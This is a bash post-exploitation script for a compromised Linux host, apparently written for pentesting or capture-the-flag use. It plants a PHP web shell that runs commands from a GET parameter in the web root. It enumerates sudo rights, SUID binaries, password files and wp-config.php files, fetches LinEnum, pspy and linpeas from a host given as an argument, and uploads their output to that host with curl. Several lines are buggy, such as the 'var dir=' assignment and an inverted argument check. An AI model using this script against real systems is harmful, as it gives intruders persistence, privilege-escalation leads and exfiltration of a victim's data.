#!/usr/bin/bash

prep()
{
	if [ -z "$1" ]
	then
		echo "Host Required"
		exit
	fi
	
	if [ -d "/dev/shm" ]; then
		var dir="/dev/shm"
	else
		var dir="/dev/tmp"
	fi
	
	mkdir $dir/recon
	cd $dir/recon
}

# Install PHP backdoor in web root
persist()
{
	echo "#### Backdoor Install Attempt ####\n"
	echo "<?php passthru($_GET['cmd']); ?>" > /var/www/`find /var/www -perm -o+w` 1>/shell.php
	if [ $? -eq 0 ]; then
		echo "\n[*] OK. Backdoor Installed.\n"
	else
		echo "\n [!] Failed. Check Permissions\n"
	fi
}

# Run quick enum commands
quick_enum()
{
	echo "\n#### Sudoers ####\n"
	sudo -l
	
	echo "\n#### Kernel ####\n"
	uname -a
	
	echo "\n#### SUID Files ####\n"
	find / -type f -perm -4000 2>/dev/null
	
	echo "\n#### Passwords in /opt?? ####\n"
	grep -iRl password /opt/*
	
	echo "\n#### Check /opt ####\n"
	ls -la /opt
	
	echo "\n#### Any wp-config.php files? ####\n"
	find / -name wp-config.php 2>/dev/null
	
	if [ -z "$2" ]
	then
		echo "\n#### Files Owned by User: $2 ####\n"
		find / -user $2 2>/dev/null
	fi
	
	echo "\n#### Processes ####\n"
	ps aux
}

# Download enumeration scripts and binaries
download()
{
	echo "\n#### Downloading LinEnum.sh ####\n"
	curl $1/LinEnum.sh
	
	echo "\n#### Downloading psspy ####\n"
	wget $1/psspy
	
	echo "\n#### Downloading linux-priv-checker ####\n"
	wget $1/linuxprivchecker.py
	
	echo "\n#### Downloading linpeas.sh ####\n"
	wget $1/linpeas.sh
}

# Execute enum scripts
execute()
{
	echo "\n#### Run LinEnum.sh ####\n"
	bash LinEnum.sh -r > lineunum.txt
	
	echo "\n#### Run linpeas.sh ####\n"
	bash linpeas.sh > linpeas.txt
}

# Exfiltrate enum script results
exfiltrate()
{
	files=("lineunum.txt" "linpeas.txt")
	
	for file in "${files[@]}"
	do
		echo "\n#### Exfiltrating: $file ####\n" 
		curl -F "data=@$file" $1:443
	done
}

run()
{
	prep
	persist
	quick_enum
	download
	execute
	exfiltrate
}

run
